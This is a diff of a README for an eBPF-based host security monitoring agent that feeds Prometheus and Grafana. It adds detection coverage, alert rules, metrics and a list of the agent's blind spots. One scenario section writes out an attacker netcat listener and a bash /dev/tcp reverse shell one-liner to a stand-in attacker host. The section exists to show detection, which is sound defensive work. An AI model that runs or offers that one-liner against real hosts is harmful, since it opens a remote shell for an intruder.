@@ -10,6 +10,7 @@ A real-time security monitoring solution using eBPF (Extended Berkeley Packet Fi
 ## Table of Contents
 
 - [Why eBPF?](#why-ebpf)
+- [MITRE ATT&CK Coverage](#mitre-attck-coverage)
 - [Screenshots](#screenshots)
 - [Features](#features)
 - [Architecture](#architecture)
@@ -17,8 +18,10 @@ A real-time security monitoring solution using eBPF (Extended Berkeley Packet Fi
 - [Quick Start](#quick-start)
 - [Configuration](#configuration)
 - [Metrics](#metrics)
+- [Reverse Shell Detection Scenario](#reverse-shell-detection-scenario)
 - [Development](#development)
 - [Troubleshooting](#troubleshooting)
+- [What This Doesn't Detect](#what-this-doesnt-detect)
 - [Security Considerations](#security-considerations)
 - [Contributing](#contributing)
 - [License](#license)
@@ -36,17 +39,81 @@ eBPF provides:
 - ✅ **Safe**: eBPF verifier ensures programs cannot crash the kernel
 - ✅ **Real-time**: Immediate event detection without polling
 
+## MITRE ATT&CK Coverage
+
+This agent maps to the following MITRE ATT&CK techniques:
+
+| Technique ID | Name | Agent Coverage |
+|---|---|---|
+| T1059 | Command and Scripting Interpreter | `execve` tracing — all command executions are counted and logged |
+| T1548 | Abuse Elevation Control Mechanism | `sudo` path detection + `setuid()`/`setgid()` tracing |
+| T1003 | OS Credential Dumping | `openat()` on `/etc/shadow`, `/etc/passwd` reads |
+| T1055 | Process Injection | `ptrace()` tracing — detects PTRACE_ATTACH and similar |
+| T1071 | Application Layer Protocol (C2) | `connect()` tracing — flags connections to known C2 ports (4444, 1337, etc.) |
+| T1078 | Valid Accounts | `openat()` on `/etc/sudoers`, `~/.ssh/authorized_keys` |
+
 ## Architecture
+
+```mermaid
+graph TB
+    subgraph Host["Host Server (Linux Kernel 5.8+)"]
+        subgraph KS["Kernel Space"]
+            TP_EXEC["tracepoint: sys_enter_execve"]
+            TP_CONN["tracepoint: sys_enter_connect"]
+            TP_PTRACE["tracepoint: sys_enter_ptrace"]
+            TP_OPEN["tracepoint: sys_enter_openat"]
+            TP_SUID["tracepoint: sys_enter_setuid/setgid"]
+
+            BPF_EXEC["eBPF: trace_exec"]
+            BPF_CONN["eBPF: trace_connect"]
+            BPF_PTRACE["eBPF: trace_ptrace"]
+            BPF_OPEN["eBPF: trace_openat"]
+            BPF_SUID["eBPF: trace_setuid/setgid"]
+
+            MAPS["Per-CPU Maps\nexec_counter | sudo_counter | passwd_read_counter\nconnect_counter | suspicious_connect_counter\nptrace_counter | sensitive_file_counter\nsetuid_counter | setgid_counter"]
+
+            TP_EXEC --> BPF_EXEC --> MAPS
+            TP_CONN --> BPF_CONN --> MAPS
+            TP_PTRACE --> BPF_PTRACE --> MAPS
+            TP_OPEN --> BPF_OPEN --> MAPS
+            TP_SUID --> BPF_SUID --> MAPS
+        end
+
+        subgraph US["User Space"]
+            AGENT["Go Agent\n(config-driven)"]
+            CONFIG["config.yaml"]
+            HTTP[":9110/metrics\n(optional TLS + basic auth)"]
+
+            CONFIG --> AGENT
+            MAPS -.->|"poll every 1s"| AGENT
+            AGENT --> HTTP
+        end
+    end
+
+    subgraph MON["Monitoring Server (Docker)"]
+        PROM["Prometheus\n:9090"]
+        GRAFANA["Grafana\n:3000"]
+        ALERTS["Alert Rules\n(dynamic baselines)"]
+
+        HTTP -->|"scrape"| PROM
+        PROM --> GRAFANA
+        PROM --> ALERTS
+    end
+```
 
 This project consists of two main components:
 
 ### 1. Host Agent (`host/ebpf-agent`)
-An eBPF-based monitoring agent that runs on Linux hosts to track:
-- All command executions (`execve` syscalls)
+A config-driven eBPF monitoring agent that runs on Linux hosts. Tracepoints and metrics are defined in `config.yaml`. Currently monitors:
+- All command executions (`execve` syscalls) with process lineage
 - Sudo privilege escalation attempts
 - `/etc/passwd` file read attempts (via `cat` or `sudo cat`)
+- Outbound network connections (`connect()`) with suspicious C2 port flagging
+- Process injection / debugger attachment (`ptrace()`)
+- Sensitive file access (`openat()` on `/etc/shadow`, `/etc/sudoers`, `~/.ssh/authorized_keys`)
+- Privilege escalation via `setuid()` / `setgid()` syscalls
 
-The agent exposes metrics via Prometheus format on port 9110.
+Each feature can be toggled at compile time via Makefile flags. The agent exposes metrics via Prometheus format on a configurable port (default 9110), with optional TLS and basic auth.
 
 ### 2. Monitoring Stack (`monitoring`)
 A complete monitoring infrastructure using Docker Compose:
@@ -81,10 +148,17 @@ A complete monitoring infrastructure using Docker Compose:
 
 ## Features
 
-- **Real-time Monitoring**: Uses eBPF tracepoints for zero-overhead kernel-level monitoring
-- **Security Alerts**: Pre-configured alerts for suspicious activities
+- **Config-Driven**: Define tracepoints and metrics in YAML — no Go code changes needed
+- **Compile-Time Feature Flags**: Toggle detection modules via Makefile (`MONITOR_EXEC=0 make bpf`)
+- **Real-time Monitoring**: eBPF tracepoints for zero-overhead kernel-level monitoring
+- **Network Visibility**: Outbound connection tracking with C2 port detection
+- **Process Injection Detection**: ptrace() monitoring for debugger/injector detection
+- **Sensitive File Monitoring**: Tracks access to /etc/shadow, /etc/sudoers, authorized_keys
+- **Privilege Escalation**: Detects sudo, setuid(), and setgid() calls
+- **Dynamic Alerting**: Rolling baseline alerts using Prometheus rate() and avg_over_time()
+- **Security Hardening**: Optional TLS and basic auth on the metrics endpoint
 - **Prometheus Integration**: Standard metrics format for easy integration
-- **Scalable**: Designed to monitor multiple hosts from a central monitoring server
+- **Graceful Shutdown**: Signal handling for clean tracepoint detachment
 
 ## Prerequisites
 
@@ -183,12 +257,44 @@ cat /etc/passwd
 
 ### Host Agent
 
-The agent is configured to monitor:
-- All `execve` syscalls
-- Commands containing `sudo` in the path
-- `cat /etc/passwd` and `sudo cat /etc/passwd` commands
+The agent is configured via `config.yaml`. Key sections:
 
-Metrics are exposed on port 9110 by default. To change this, modify `cmd/agent/main.go`.
+```yaml
+server:
+  port: 9110
+  metrics_path: /metrics
+  tls:
+    enabled: false
+    cert_file: ""
+    key_file: ""
+  basic_auth:
+    enabled: false
+    username: ""
+    password: ""
+
+poll_interval: 1s
+
+tracepoints:
+  - group: syscalls
+    name: sys_enter_execve
+    program: trace_exec
+  # ... additional tracepoints
+
+metrics:
+  - name: ebpf_exec_events_total
+    help: "Total execve events recorded by eBPF"
+    bpf_map: exec_counter
+  # ... additional metrics
+```
+
+To add a new metric, add the BPF map in the C code, add the metric entry in `config.yaml`, and rebuild.
+
+To disable a detection module at compile time:
+```bash
+make bpf MONITOR_CONNECT=0 MONITOR_PTRACE=0
+```
+
+Available feature flags: `MONITOR_EXEC`, `MONITOR_SUDO`, `MONITOR_PASSWD`, `MONITOR_CONNECT`, `MONITOR_PTRACE`, `MONITOR_OPENAT`, `MONITOR_SETUID`.
 
 ### Monitoring Stack
 
@@ -207,11 +313,21 @@ Replace `YOUR_HOST_IP` with the IP address of the server where the eBPF agent is
 
 Pre-configured alerts in `monitoring/Docker/compose/prometheus/rules/alerts.yml`:
 
-- **EBPFExporterDown**: Agent is unreachable
-- **HighExecutionRate**: >10 exec/sec for 2 minutes
-- **CriticalExecutionSpike**: >50 exec/sec for 1 minute
-- **SudoUsageDetected**: Any sudo command execution
-- **RapidSudoUsage**: >0.1 sudo/sec for 2 minutes
+- **EBPFExporterDown**: Agent is unreachable (critical)
+- **HighExecutionRate**: Exec rate 1.5x above rolling 1h baseline for 2 minutes (warning)
+- **CriticalExecutionSpike**: Exec rate 3x above baseline for 1 minute (critical)
+- **SudoUsageDetected**: Any sudo command execution (info)
+- **RapidSudoUsage**: >0.1 sudo/sec for 2 minutes (warning)
+- **SetuidDetected / SetgidDetected**: Any setuid()/setgid() call (warning)
+- **PasswdReadDetected**: /etc/passwd read (warning)
+- **SensitiveFileAccess**: Access to /etc/shadow, /etc/sudoers, authorized_keys (warning)
+- **RapidSensitiveFileAccess**: Repeated sensitive file access (critical)
+- **SuspiciousOutboundConnection**: Connection to known C2 port (critical)
+- **HighOutboundConnectRate**: Connect rate 1.5x above baseline (warning)
+- **PtraceDetected**: Any ptrace() call (critical)
+- **RapidPtraceUsage**: Multiple ptrace() calls (critical)
+
+Alerts use dynamic rolling baselines via `rate()` and `avg_over_time()` instead of hardcoded thresholds where applicable.
 
 ## Metrics
 
@@ -222,8 +338,113 @@ The eBPF agent exposes the following Prometheus metrics:
 | `ebpf_exec_events_total` | Counter | Total number of execve syscalls |
 | `ebpf_sudo_events_total` | Counter | Total sudo command executions |
 | `ebpf_passwd_read_events_total` | Counter | Total /etc/passwd read attempts |
+| `ebpf_connect_events_total` | Counter | Total outbound connect() syscalls |
+| `ebpf_suspicious_connect_events_total` | Counter | Connections to suspicious C2 ports (4444, 1337, 5555, 6666, 8443, 1234, 31337) |
+| `ebpf_ptrace_events_total` | Counter | Total ptrace() syscalls (process injection/debugger) |
+| `ebpf_sensitive_file_access_total` | Counter | openat() on /etc/shadow, /etc/sudoers, authorized_keys |
+| `ebpf_setuid_events_total` | Counter | Total setuid() syscalls |
+| `ebpf_setgid_events_total` | Counter | Total setgid() syscalls |
+
+All metrics are defined in `config.yaml` and registered dynamically at startup.
+
+## Reverse Shell Detection Scenario
+
+This is an end-to-end example of how the agent detects a reverse shell attack.
+
+**1. Attacker sets up a listener:**
+```bash
+# On attacker machine
+nc -lvnp 4444
+```
+
+**2. Victim executes a reverse shell (e.g., via a compromised web app):**
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+**3. What the agent sees (in order):**
+
+| Time | Event | Metric Incremented |
+|------|-------|--------------------|
+| T+0s | `execve("bash", ...)` | `ebpf_exec_events_total` |
+| T+0s | `connect(fd, {port=4444}, ...)` | `ebpf_connect_events_total` + `ebpf_suspicious_connect_events_total` |
+| T+1s | Attacker runs `whoami` via shell | `ebpf_exec_events_total` |
+| T+2s | Attacker runs `sudo su` | `ebpf_exec_events_total` + `ebpf_sudo_events_total` |
+| T+3s | Attacker runs `cat /etc/shadow` | `ebpf_sensitive_file_access_total` |
+
+**4. Alerts that fire:**
+
+- `SuspiciousOutboundConnection` — fires immediately on the connect to port 4444 (critical)
+- `SudoUsageDetected` — fires when attacker escalates privileges
+- `SensitiveFileAccess` — fires on /etc/shadow read
+- `HighExecutionRate` — may fire if attacker runs many commands
+
+**5. Alert chain visualized:**
+
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant V as Victim Host
+    participant BPF as eBPF Agent
+    participant P as Prometheus
+    participant G as Grafana
+
+    A->>V: bash reverse shell (execve)
+    V->>BPF: tracepoint: sys_enter_execve
+    BPF->>BPF: exec_counter++
+
+    V->>V: connect() to attacker:4444
+    V->>BPF: tracepoint: sys_enter_connect
+    BPF->>BPF: connect_counter++ & suspicious_connect_counter++
+
+    P->>BPF: scrape /metrics
+    P->>P: 🚨 SuspiciousOutboundConnection fires
+
+    A->>V: sudo su
+    V->>BPF: tracepoint: sys_enter_execve
+    BPF->>BPF: exec_counter++ & sudo_counter++
+    P->>BPF: scrape /metrics
+    P->>P: 🚨 SudoUsageDetected fires
+
+    A->>V: cat /etc/shadow (openat)
+    V->>BPF: tracepoint: sys_enter_openat
+    BPF->>BPF: sensitive_file_counter++
+    P->>BPF: scrape /metrics
+    P->>P: 🚨 SensitiveFileAccess fires
+
+    P->>G: Alert notifications
+    G->>G: Dashboard shows correlated spike
+```
+
+In Grafana, the dashboard would show a spike in exec events, a sudden connect to a C2 port, followed by sudo and sensitive file access — all correlated in time. This pattern is a strong indicator of a reverse shell with post-exploitation activity.
 
 ## Development
+
+### Build Pipeline
+
+```mermaid
+graph LR
+    subgraph Compile
+        C["exec.bpf.c"] -->|"clang -target bpf\n+ feature flags"| OBJ["exec.bpf.o"]
+        OBJ -->|"embed"| GO["main.go"]
+        CFG["config.yaml"] -->|"parsed at runtime"| GO
+        GO -->|"go build"| BIN["ebpf-agent"]
+    end
+
+    subgraph Runtime
+        BIN -->|"loads BPF"| KERNEL["Kernel Tracepoints"]
+        BIN -->|"serves"| METRICS[":9110/metrics"]
+    end
+
+    subgraph Flags["Makefile Feature Flags"]
+        F1["MONITOR_EXEC=1"]
+        F2["MONITOR_CONNECT=1"]
+        F3["MONITOR_PTRACE=1"]
+        F4["MONITOR_OPENAT=1"]
+        F5["MONITOR_SETUID=1"]
+        F1 & F2 & F3 & F4 & F5 -->|"-D flags"| C
+    end
+```
 
 ### Building the eBPF Program
 
@@ -262,15 +483,20 @@ This is useful for debugging and verifying that the kernel-level data collection
 ├── host/
 │   └── ebpf-agent/
 │       ├── bpf/                    # eBPF C programs
-│       │   ├── exec.bpf.c         # Main eBPF program
+│       │   ├── exec.bpf.c         # Main eBPF program (modular, ifdef-guarded)
 │       │   ├── vmlinux.h          # Kernel type definitions
 │       │   └── bpf_helpers.h      # eBPF helper functions
 │       ├── cmd/agent/             # Agent entry point
-│       │   ├── main.go            # Main application
-│       │   └── bpf/exec.bpf.o     # Embedded eBPF object
-│       ├── exporter/              # Prometheus metrics
-│       │   └── metrics.go
-│       ├── Makefile               # Build automation
+│       │   ├── main.go            # Config-driven main application
+│       │   └── bpf/exec.bpf.o    # Embedded eBPF object
+│       ├── internal/
+│       │   ├── config/            # YAML config parsing
+│       │   │   ├── config.go
+│       │   │   └── config_test.go
+│       │   └── poller/            # Generic per-CPU map poller
+│       │       └── poller.go
+│       ├── config.yaml            # Agent configuration
+│       ├── Makefile               # Build with feature flags
 │       ├── ebpf-agent.service     # Systemd service file
 │       ├── go.mod
 │       └── go.sum
@@ -279,10 +505,11 @@ This is useful for debugging and verifying that the kernel-level data collection
 │       ├── docker-compose.yml
 │       ├── prometheus/
 │       │   ├── prometheus.yml     # Prometheus config
-│       │   └── rules/alerts.yml   # Alert rules
+│       │   └── rules/alerts.yml   # Dynamic alert rules
 │       └── grafana/
 │           └── provisioning/      # Grafana datasources
 ├── screenshots/                   # Project screenshots
+├── state.md                       # Project state and roadmap
 ├── DEPLOYMENT.md                  # Production deployment guide
 └── CONTRIBUTING.md                # Contribution guidelines
 ```
@@ -305,6 +532,19 @@ This is useful for debugging and verifying that the kernel-level data collection
 - Check Prometheus rules: http://localhost:9090/alerts
 - Review alert configuration in `prometheus/rules/alerts.yml`
 - Verify alert rules are loaded: http://localhost:9090/rules
+
+## What This Doesn't Detect
+
+This agent is counter-based and monitors specific syscalls. It does not:
+
+- **Inspect packet payloads** — connect() tracing sees the destination port/IP but not the data being sent. Encrypted C2 over port 443 looks identical to normal HTTPS traffic.
+- **Detect fileless malware** — if an attacker operates entirely in memory (e.g., memfd_create + execveat), the standard execve tracepoint won't fire.
+- **Correlate events across hosts** — each agent is independent. A lateral movement chain across multiple hosts requires external correlation (e.g., in Grafana/SIEM).
+- **Monitor container-level isolation** — the agent sees all syscalls on the host kernel. It doesn't distinguish between container namespaces without additional PID/cgroup filtering.
+- **Detect kernel rootkits** — if an attacker loads a malicious kernel module that hooks syscalls before the eBPF tracepoint, events can be hidden.
+- **Track DNS queries** — no DNS-level monitoring. C2 over DNS tunneling would not be flagged.
+- **Monitor file writes** — only openat() reads on specific sensitive files are tracked. Writes to arbitrary files (e.g., dropping a webshell) are not detected.
+- **Detect LD_PRELOAD / library injection** — shared library hijacking doesn't trigger ptrace() and may not trigger execve().
 
 ## Security Considerations
 
